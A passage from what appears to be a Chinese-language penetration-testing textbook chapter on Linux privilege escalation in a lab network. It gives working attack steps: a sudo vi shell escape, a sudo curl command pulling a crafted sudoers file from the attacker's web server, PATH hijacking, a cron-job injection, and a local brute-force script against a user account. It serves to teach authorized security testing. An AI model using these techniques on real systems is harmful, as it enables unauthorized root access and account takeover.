在终端中输入 sudo vi，然后按 SHIFT-: 并输入 !bash。你现在应该已经进入 root shell！输入 whoami 命令确认你是 root 用户。此时，你应该使用 passwd 命令（不带任何额外参数）设置 root 账户的密码，以便随时能够轻松登录。

### 下载恶意的 sudoers 文件。

在前一部分中，你可能已经注意到我们还拥有对 curl 的 sudo 访问权限，用于从 Web 服务器读取资源。你可能会问，拥有对基于命令行的 HTTP 客户端的 sudo 访问权限，我们能做什么呢？嗯，很多事情！

如果你查看 curl 手册页面，你会看到它提供了 -o（输出）标志，用于将内容写入文件或目录。这意味着你可以通过向网站发出 GET 请求并使用 -o 标志将输出重定向到文件来下载文件。

为了利用这种行为，我们可以设置一个远程 Web 服务器，提供一个配置文件；如果我们能以某种方式下载这个文件并覆盖现有文件，就可以提升我们的权限或获得新的访问权限。让我们再次利用 *p-jumpbox-01*（176.16.10.13）从备份用户提升到 *root* 用户。以下是我们可以采取的几个方向：

+   提供修改过的 */etc/passwd* 和 */etc/shadow* 文件，这些文件会改变 *root* 用户的密码。

+   提供修改过的 */etc/sudoers* 文件，使其授予备份用户 sudo 权限。

+   在 */etc/sudoers.d* 目录中插入新的 sudo 配置。

+   提供一个 cron-job shell 脚本，它以系统（root）身份运行，并负责代表我们执行特权操作。

我们将选择第三个选项：从 Kali 机器提供一个自定义的 *sudoers* 文件，并将其插入到目标的 */etc/sudoers.d* 目录。

首先，从本书的 GitHub 仓库获取新的 sudo 配置文件*add-sudo-to-user*，并将其放置在文件系统中的某个位置，例如 Kali 的主目录。接下来，打开终端并导航到下载文件所在的目录。然后运行以下命令，在 8080 端口启动一个 Web 服务器：

```
$ **python3 -m http.server 8080**
```

接下来，作为*p-jumpbox-01*备份用户，运行以下命令从 Kali 下载文件。Kali 的实验室 IP 地址应该是 172.16.10.1：

```
$ **sudo curl -s http://172.16.10.1:8080/add-sudo-to-user -o /etc/sudoers.d/add-sudo-to-user**
```

这个 curl 命令使用-s 标志（静默模式）来抑制输出，比如下载进度条。然后我们向 Kali 机器发起 GET 请求来获取*add-sudo-to-user*。-o（输出）标志指向一个文件系统目标位置，GET 请求的输出将被保存到该位置。在这种情况下，我们使用*/etc/sudoers.d*目录。使用 ls 命令列出*/etc/sudoers.d*中的文件来确认文件是否已成功下载。然后运行 sudo -l 命令，查看你现在是否拥有完整的 sudo 权限。

请记住，手动修改*sudoers*文件是非常危险的。任何错误可能会影响你将来重新获得 sudo 访问权限的能力，因此我们强烈建议使用像 visudo 这样的专用 sudo 修改工具来修改 sudo 配置。该工具可以及早捕捉语法错误，避免你被锁定。

在成功攻陷 root 账户后，我们建议将账户密码设置为*passwd*，以便稍后能够轻松切换到该账户。

## 通过 PATH 配置错误劫持可执行文件

PATH 环境变量是一个以冒号分隔的目录列表，shell 默认在这些目录中搜索可执行文件。例如，当你输入 touch 命令创建一个文件时，shell 会在 PATH 中搜索以定位二进制文件。

在任何被攻陷的机器上运行以下命令查看其当前 PATH 值：

```
$ **echo $PATH**

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
```

为了尝试提升权限，我们可以修改 PATH 变量以包含额外的路径。例如，假设系统有一个专门的自定义脚本目录*/data/scripts*。修改 PATH 目录以包含这个脚本目录非常简单：

```
$ **PATH=$PATH:/data/scripts**
$ **echo $PATH**

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/data/scripts 
```

我们可以像之前的示例一样将路径追加到 PATH 中，也可以将它们提前。以下示例中，我们将当前工作目录（.）添加到路径前面：

```
$ **PATH=.:$PATH**
```

现在，如果一个可执行文件以 root 身份运行并调用外部命令作为其逻辑的一部分，它可能会执行攻击者控制的文件，而不是预期的可执行文件。

作为一个示例，让我们使用 PATH 劫持来运行一个自定义可执行文件。我们将以以下用 C 语言编写的程序为目标，该程序调用了 whoami 命令。让我们看看是否能够让它运行我们选择的不同二进制文件：

```
#include <stdio.h>
#include <stdlib.h>

int main(void)
    // This has the potential to get hijacked.
  ❶ system("whoami");

    // This should not be possible to hijack.
  ❷ system("/usr/bin/whoami");
    return 0;
} 
```

在❶处，代码使用命令 system("whoami")调用 whoami 命令，在❷处，它通过使用其绝对路径*/usr/bin/whoami*直接调用*whoami*二进制文件。

将此代码复制到任何被攻陷的机器上，保存为名为*getuser.c*的新文件。你也可以直接从书籍的 GitHub 仓库下载此文件。接下来，使用 GNU 编译器集合（GCC）编译该程序并使其可执行：

```
$ **gcc getuser.c -o getuser**
```

这应该会创建一个名为*getuser*的新二进制文件。让我们设置其可执行权限：

```
$ **chmod u+x getuser**
```

现在，设置 PATH，使当前目录被添加到它的前面：

```
$ **PATH="$(pwd):$PATH"**
$ **echo $PATH**
**/tmp**:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
```

在这个输出中，你可以看到*/tmp*目录被添加到 PATH 前面。这是因为我们在执行此命令时位于*/tmp*目录；如果你导航到其他目录，你的值可能会有所不同。确保*getuser*二进制文件位于你添加到 PATH 前面的目录中。

由于我们控制了 PATH 中的一个目录，我们可以在该路径中创建一个伪造的*whoami*脚本（清单 9-2）。

```
$ **echo "#!/bin/bash" >> whoami**
$ **echo "I am not the whoami you were looking for!" >> whoami**
$ **chmod u+x whoami** 
```

清单 9-2：伪造 whoami 可执行文件

*getuser*程序将在 PATH 中查找 whoami 命令，既然*/tmp*会最先被读取，它应该会选择伪造的程序。运行*getuser*查看结果：

```
$ **./getuser**

I am not the whoami you were looking for!
root 
```

正如你所看到的，程序执行了伪造的*whoami*脚本。然而需要注意的是，程序第二次调用 whoami 时执行了正确的命令，因为它指定了文件的完整路径。

练习 17：恶意修改 Cron 任务

第八章介绍了计划任务，包括它们通常在文件系统中的位置以及如何执行它们。计划任务通常运行一个自定义脚本，旨在执行特定操作，该脚本可能会引用其他本地文件来获取信息。此外，脚本可能会以提升的权限运行。因此，在寻找权限提升漏洞时，它们是一个有趣的探索方向。

在*p-jumpbox-01*（172.16.10.13）上，查看*/etc/crontab*文件的内容：

```
$ **cat /etc/crontab**

`--snip--`
*/5 * * * * root bash /scripts/backup_data.sh 
```

如你所见，命令 bash /scripts/backup_data.sh 每五分钟运行一次，并使用*root*用户。让我们检查一下这个脚本是否对我们可访问：

```
$ **ls -l /scripts/backup_data.sh**

-rw-r--r-- 1 root root 508 Jul  4 02:50 /scripts/backup_data.sh 
```

的确如此，让我们来看看脚本的内容，如清单 9-3 所示。你有什么发现吗？

```
#!/bin/bash
❶ CURRENT_DATE=$(date +%y-%m-%d)

if [[! -d "/data/backup"]]; then
  mkdir -p /data/backup
fi

# Look for external instructions if they exist.
❷ for directory in "/tmp" "/data"; do
❸ if [[-f "${directory}/extra_cmds.sh"]]; then
  ❹ source "${directory}/extra_cmds.sh"
  fi
done

# Back up the data directory.
echo "Backing up /data/backup - ${CURRENT_DATE}"

❺ tar czvf "/data/backup-${CURRENT_DATE}.tar.gz" /data/backup
rm -rf /data/backup/*

echo "Done." 
```

清单 9-3：数据备份脚本

脚本首先通过当前日期设置`CURRENT_DATE`变量 ❶。然后，for 循环遍历*/tmp*和*/data*目录 ❷，并测试每个目录中是否存在文件*extra_cmds.sh* ❸。如果脚本找到了该文件，source 命令将*extra_cmds.sh*脚本 ❹ 复制到当前执行的脚本中，这样它会在同一 shell 中运行所有指令。接下来，tar 命令将*/data/backup*目录中的内容压缩成一个单独的*tar.gz*文件，并存放在*/data*目录下 ❺。脚本随后删除*/data/backup*中剩余的任何内容。

这个脚本包含一个漏洞；它没有考虑到 */tmp* 是一个全世界可访问的目录。如果 *extra_cmds.sh* 文件不存在，某人可能会创建一个，然后为 cron 作业引入额外的指令。此外，*/data* 目录也是可写的，这似乎是一个配置错误。运行 stat（或 ls）命令查看 */data* 上设置的权限。

要测试此漏洞，可以将内容写入 *extra_cmd.sh* 文件。列表 9-4 提供了一个简单的概念验证示例。

```
#!/bin/bash

echo "The running user is: $(whoami)" >> /tmp/proof-of-concept 
```

列表 9-4：利用易受攻击的 cron 作业的概念验证脚本

通过 Cron 执行这个脚本会导致在 */tmp* 下生成一个名为 *proof-of-concept* 的新文件，文件内容为：The running user is: 后跟 whoami 命令的输出，在这个案例中应该是 root。

保存此文件并使用 chmod 设置可执行权限，然后等待五分钟查看结果：

```
$ **ls -l**
-rwxr--r-- 1 root root 104 Jul  4 03:24 extra_cmds.sh
-rw-r--r-- 1 root root  26 Jul  4 03:25 proof-of-concept

$ **cat proof-of-concept**
The running user is: root 
```

shell 脚本中的漏洞并不罕见，因为它们通常在假设操作环境没有恶意用户可能寻找利用漏洞的情况下编写。名为 *linters* 的工具，如 ShellCheck (*[`www.shellcheck.net`](https://www.shellcheck.net)*)，帮助在编写 shell 脚本时执行最佳实践。ShellCheck 还会突出显示可能由于代码错误导致安全风险的潜在代码区域。

为了进一步利用这个漏洞，考虑编写一个新的 *extra_cmd.sh*，执行以下任一操作：

+   修改 sudo 配置，以授予你选择的用户权限。

+   更改感兴趣目录的权限，例如日志目录，以便你的低权限用户可以访问它。

+   从其他用户的主目录复制文件到你的用户可以读取的目录。

## 查找内核漏洞

当高危内核级漏洞被发现时，通常会让安全行业既兴奋又恐慌。虽然它们通常通过安全披露渠道负责任地公开，但我们有时只能在威胁行为者试图通过使用零日漏洞获得特权访问时才得知这些漏洞。

> 警告

*这些漏洞可能会使内核崩溃，因此除非你获得了客户的明确许可，否则你应该避免在渗透测试中使用它们。*

内核漏洞通常针对特定的内核版本、CPU 架构（如 x86_64 或 ARM）或操作系统，因此在使用其中之一之前，你需要先分析系统，以确定正在运行的内核版本。在你的 Kali 机器上运行以下命令：

```
$ **uname -r -v**

6.x.x-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.x.xx-1kali2 
```

你可以通过搜索感兴趣的特定内核版本，在像 *[`exploit-db.com`](https://exploit-db.com)* 这样的数据库中找到内核漏洞。虽然这可能是一个手动过程，但自动化工具旨在通过将内核版本与 CVE 列表匹配，使搜索过程更快、更准确。

### SearchSploit

*SearchsSploit* 是 Kali 中内置的一个命令行工具，它与 Exploit-DB 接口连接，允许你从终端执行搜索。

以下命令会搜索针对 *Dirty COW 漏洞*（CVE-2016-5195）的 Linux 内核漏洞，这是一个竞态条件漏洞，影响了 4.8.3 之前的内核版本：

```
$ **searchsploit linux kernel | grep -i "dirty cow"**

Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Es...
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method) 
```

其他工具旨在通过本地分析系统并将内核版本与易受攻击的内核和漏洞数据库进行匹配，来自动化内核漏洞搜索。其中一个工具是 Linux Exploit Suggester 2。

### Linux Exploit Suggester 2

*Linux Exploit Suggester 2* 是一个在系统上本地运行的 Perl 脚本。它尝试查找与当前运行的内核版本匹配的漏洞。为了尝试它，可以在你的 Kali 机器上运行以下命令：

```
$ **perl /home/kali/tools/linux-exploit-suggester-2/linux-exploit-suggester-2.pl**

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 6.x.x
  Searching 72 exploits...

  Possible Exploits

  No exploits are available for this kernel version 
```

在后台，漏洞建议脚本包含一个数据库，截至目前已有超过 70 个内核漏洞。一些例子包括 OverlayFS 漏洞（CVE-2015-8660）和 eBPF 漏洞（CVE-2017-16695）。

## 攻击相邻账户

当你作为非 root 用户登陆到一个被攻破的主机时，你可能会想通过攻击其他系统账户来提升权限。你甚至可能通过攻破一个非 root 账户来获取 root 访问权限，前提是该账户拥有某些特权，比如无限制的 sudo 权限或家目录下的某个文件包含凭证。

我们可以尝试使用 bash 来暴力破解系统账户。首先，让我们通过执行 grep 搜索 */bin/bash* 来识别具有活动 shell 的账户（不过请记住，也可能有其他的 shell）。在 *p-jumpbox-01*（172.16.10.13）上执行以下命令：

```
$ **grep "/bin/bash" /etc/passwd | grep -v "backup:x"**

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
jmartinez:x:1001:1001::/home/jmartinez:/bin/bash
dbrown:x:1002:1002::/home/dbrown:/bin/bash
ogarcia:x:1003:1003::/home/ogarcia:/bin/bash
arodriguez:x:1004:1004::/home/arodriguez:/bin/bash 
```

为了举例说明，我们将攻击账户 *jmartinez*。列表 9-5 尝试暴力破解该账户的密码。

local_account _bf.sh

```
#!/bin/bash
❶ USER="jmartinez"
❷ PASSWORD_FILE="passwords.txt"

if [[! -f "${PASSWORD_FILE}"]]; then
  echo "password file does not exist."
  exit 1
fi

❸ while read -r password; do
  echo "Attempting password: ${password} against ${USER}..."
  if echo "${password}" | timeout 0.2 su - ${USER} \
          -c 'whoami' | grep -q "${USER}"; then
    echo
    echo "SUCCESS! The password for ${USER} is ${password}"
    echo "Use su - ${USER} and provide the password to switch"
    exit 0
  fi
done < "${PASSWORD_FILE}"

echo "Unable to compromise ${USER}."
exit 1 
```

列表 9-5：暴力破解相邻账户

在这个脚本中，我们设置了两个变量：USER，表示要攻击的账户名 ❶，以及 PASSWORD_FILE，一个包含密码列表的文件 ❷。

接下来，我们通过使用一个 while 循环 ❸ 来读取 PASSWORD_FILE 的内容，遍历每一个存在的密码。我们将每个密码输出到标准输出流，并将其通过管道传输给 su 命令。然后，我们使用 su - ${USER} -c 'whoami' 来尝试切换到该用户并在成功后执行 whoami 命令。

如果 whoami 命令在输出中返回我们正在暴力破解的用户名（在这个例子中是 *jmartinez*），那么就表示我们成功地猜测出了密码并以该用户身份执行了命令。我们可以使用 grep -q "${USER}" 来验证是否返回了这个字符串。

让我们进行测试。通过你目前学到的方法，将脚本下载并保存到 *p-jumpbox-01* 机器上。

接下来，向 *passwords.txt* 文件中写入一些密码。确保该文件与 *local_account_bf.sh* 脚本位于同一目录下：

```
$ **echo test >> passwords.txt**
$ **echo test123 >> passwords.txt**
$ **echo password123 >> passwords.txt**
$ **echo admin >> passwords.txt** 
```

现在运行脚本并观察其输出：

```
$ **bash local_account_bf.sh**
Attempting password: test against jmartinez...
Password: Attempting password: test123 against jmartinez...
Password: Attempting password: password123 against jmartinez...
Password:
**SUCCESS! The password for jmartinez is password123**

Use su - jmartinez and provide the password to switch 
```

密码被发现是*password123*！尝试切换到用户并提供密码：

```
$ **su — jmartinez**
```

接下来，你应该能够看到该用户在任何地方都有 sudo 权限，运行`sudo -l`来验证：

```
$ **sudo -l**

Matching Defaults entries for jmartinez on p-jumpbox-01:
`--snip--`
User jmartinez may run the following commands on p-jumpbox-01:

  **  (ALL : ALL) ALL** 
```

这应该能让我们访问 root 账户。为了确认我们能够切换到 root 用户，请键入以下命令：

```
$ **sudo su**
# **whoami**

root 
```

恭喜！你成功攻破了这台机器。

## 利用 GTFOBins 进行特权提升

我们可以在基于 Linux 的机器上使用常见的工具执行各种恶意操作。GTFOBins 项目（*[`gtfobins.github.io`](https://gtfobins.github.io)*)突出了许多这样的工具，特别是如果攻击者具有 SetUID 或 sudo 权限，他们可以利用这些工具做什么。如图 9-3 所示，一些工具允许任意文件读取和写入、文件下载和上传、反向 Shell 等。

![](img/pg228.jpg)

图 9-3：GTFOBins 首页

当你检查文件系统中的 sudo 访问权限或某些工具或二进制文件上的 SetUID 权限时，我们强烈建议你搜索 GTFOBins 数据库，以了解可能的攻击机会。

练习 18：将 GTFOBins 漏洞映射到本地二进制文件

你能自动化搜索 GTFOBins 仓库吗？在这个练习中，你将使用 bash 将目标系统上可用的工具列表映射到 GTFOBins 数据库中的工具。GTFOBins 项目托管在 GitHub 上，每个二进制文件都有自己的 Markdown 文档文件（扩展名为*.md*），因此你需要让你的脚本执行以下操作：

1.  搜索系统和用户二进制文件（在诸如*/bin*、*/usr/bin*和*/usr/sbin*等目录中）。为了这个练习，搜索应关注 SetUID 文件。

2.  使用过滤命令提取仅包含文件名的结果，而不包含路径。

3.  对 GTFOBins 数据库执行 HTTP GET 请求，使用文件名搜索正确的文档文件。

4.  将结果打印到控制台或文件中。

你的脚本应该能够输出它在系统上找到的所有二进制文件的利用方法，这些二进制文件在数据库中有匹配项。你可以在这里查看 wget 二进制文件的 GTFOBins 页面示例： *[`raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/wget.md`](https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/wget.md)*。

如果你遇到困难，可以查看书本 GitHub 仓库中的示例解决方案，*gtfobins_search.sh*。

## 自动化特权提升

如你所见，特权提升既需要时间也需要技巧。幸运的是，有一些脚本旨在自动化这一繁琐的任务，即通过系统目录筛选，寻找配置错误或未加固的组件。

### LinEnum

我们在第八章中使用过 LinEnum 来收集信息。如果使用 -t（彻底）标志运行检查，它应返回一些可能帮助你提升权限的详细信息，例如属于当前用户的文件、隐藏文件、私钥以及 Git 凭据文件。

但该脚本的输出可能会很冗长，因为它会打印每一个发现。-k（关键字）选项会在系统范围内搜索你选择的关键字：

```
$ **./LinEnum.sh -t -k "P@ssw0rd"**
```

该命令会在当前用户可访问的文件中搜索字符串 P@ssw0rd。

### unix-privesc-check

尽管稍显陈旧，*unix-privesc-check* 仍然是一个独立的 Shell 脚本，可以在系统中搜索本地配置错误。从你的 Kali 机器（文件应位于 */home/kali/tools/unix-privesc-check* 或 */usr/bin/unix-privesc-check*）复制 *unix-privesc-check* 脚本到任何被攻破的主机上，然后使用标准选项运行扫描：

```
$ **unix-privesc-check standard**
```

标准选项经过优化，速度较快，会迅速枚举系统中的配置错误，但提供的枚举覆盖较少。详细选项则更有可能捕捉到主机上第三方软件中的配置错误：

```
$ **unix-privesc-check detailed**
```

你应该看到类似 LinEnum 输出的内容：

```
`--snip--`
###########################################
Checking cron job programs aren't writable (/var/spool/cron/crontabs)
############################################

No user crontabs found in /var/spool/cron/crontabs.  Skipping checks.

############################################
Checking cron job programs aren't writable (/var/spool/cron/tabs)
############################################

Directory /var/spool/cron/tabs is not present.  Skipping checks.

############################################
Checking inetd programs aren't writable
############################################

File /etc/inetd.conf not present.  Skipping checks.
`--snip--` 
```

还有一些其他你应该熟悉的权限提升自动化工具。

### MimiPenguin

MimiPenguin (*[`github.com/huntergregal/mimipenguin`](https://github.com/huntergregal/mimipenguin)*) 是一个扫描工具，用于查找已登录用户的凭证，这些用户连接到运行桌面环境（如 GNOME 桌面环境）和显示管理器（如 LightDM 或 GNOME Display Manager）的 Linux 系统。如果你有 Windows 渗透测试的背景，可能对 Mimikatz 熟悉，它是一个流行的工具，用于提取存储在内存中的凭证。MimiPenguin 是为在 Linux 世界中执行等效任务而创建的。

### Linuxprivchecker

由 Mike Czumak (T_v3rn1x) 开发的基于 Python 的工具 Linuxprivchecker (*[`github.com/sleventyeleven/linuxprivchecker/tree/master`](https://github.com/sleventyeleven/linuxprivchecker/tree/master)*)，执行本地明文密码搜索，寻找文本编辑器等实用工具中的 Shell 逃逸机会，基于正在运行的内核版本提供内核漏洞建议，搜索文件和目录权限配置错误等。

### Bashark

Bashark (*[`github.com/redcode-labs/Bashark/tree/master`](https://github.com/redcode-labs/Bashark/tree/master)*) 是一个由 wintrmvte 开发的 Shell 脚本。它提供一个终端用户界面，带有帮助函数，适用于各种攻击性安全任务，如用户枚举、端口扫描、反向 Shell 生成和主机枚举。其目的是在无需编写脚本的情况下，主要使用 Linux 系统中常见的工具，简化常见任务的执行。

## 总结

在本章中，你学习了权限提升的基本知识，探讨了 Linux 系统中基本和高级的文件权限特性，然后检查了本地系统中的文件和目录配置错误。你还浏览了系统中常见的存储凭证的位置，并检查了可能导致权限提升漏洞的机制配置，如 sudo、PATH 和 cron 作业。最后，你对其他系统账户进行了本地暴力破解攻击。
